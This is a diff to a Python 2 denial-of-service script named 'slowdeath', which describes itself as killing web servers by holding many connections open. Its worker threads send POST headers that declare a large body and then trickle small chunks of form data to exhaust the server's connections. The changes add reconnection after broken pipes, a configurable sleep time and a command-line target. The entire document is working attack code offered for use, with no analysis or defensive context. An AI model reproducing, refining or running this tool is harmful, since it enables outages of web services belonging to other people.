@@ -27,7 +27,8 @@ def openConnections(url, threads, sleepTime) :
 
 		print "Started %d threads. Hit ctrl-c to exit" % (threads)
 
-		sleep(35)
+		sleep(sleepTime)
+		print "exiting"
 		for worker in pool: worker.stop()
 
 		for worker in pool: worker.join()
@@ -51,24 +52,40 @@ class Worker (threading.Thread):
 	def stop(self): self.stopped = True
 
 	def run(self):
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((self.host, self.port))
-		s.settimeout(1)
-		s.send(
-		    'POST ' + self.path + ' HTTP/1.1\r\n' +
-		    'Host: ' + self.host + '\r\n' +
-		    'Connection: close\r\n' +
-		    'Content-Length: 10000000\r\n' +
-		    '\r\n'
-		)
-
 		while not self.stopped:
-			s.send('abc=123&')
-			sleep(self.sleepTime/1000) 
+			flag = True
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((self.host, self.port))
+			s.settimeout(1)
+			s.send(
+				'POST ' + self.path + ' HTTP/1.1\r\n' +
+				'Host: ' + self.host + '\r\n' +
+				'Connection: close\r\n' +
+				'Content-Length: 100000\r\n' +
+				'\r\n'
+			)
 
-		s.close()
+			while( not self.stopped and flag==True):
+				
+				try:
+					data = 'abc=123&'
+					#print data
+					s.send(data.encode('utf-8'))
+					sleep(self.sleepTime/1000) 
+				except socket.error, e:
+					if isinstance(e.args, tuple):
+						if e[0] == errno.EPIPE:
+							flag = False
+							print "error"
+						else:
+							pass
+					else:
+						pass
+			
 
-def main(ipAdd):
+			#s.close()
+
+def main():
 	parser = OptionParser(
 	    version="slowdeath v0.1",
 	    description="Kills webservers by keeping many connections open, avoiding timeouts.",
@@ -93,9 +110,9 @@ def main(ipAdd):
 
 	#if len(args) < 1: parser.error("This utility requires at least 1 argument")
 
-	#url = args[0]
-	url = 'http://' + ipAdd
-	x=500
+	url = args[0]
+	#url = 'http://' + ipAdd
+	x=1
 	while(x>0):
 		openConnections(url, options.threads, options.sleepTime)
 		x=x-1
